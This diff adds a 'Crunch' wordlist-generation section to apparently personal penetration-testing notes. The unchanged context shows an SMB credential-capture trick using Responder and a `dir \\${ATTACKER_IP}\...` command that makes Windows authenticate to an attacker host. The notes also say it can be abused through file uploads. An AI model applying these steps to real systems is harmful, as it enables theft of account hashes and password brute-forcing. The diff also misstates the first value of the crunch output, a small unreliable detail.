@@ -129,3 +129,16 @@ sudo responder -I tun0
 Now, from the Windows shell, do something like `dir \\${ATTACKER_IP}\thiswillgetdenied`.
 
 Note that if you can get a windows server to access such an SMB path remotely, this trick can also be abused via e.g. fileuploads
+
+
+## Crunch
+
+We can use the tool `crunch` to quickly generate simple wordlists.
+This can eg be done by doing:
+
+```
+crunch 10 10 -t test%%%%%% > testworldlist.txt
+```
+Which will print `test000001` through `test999999`.
+
+
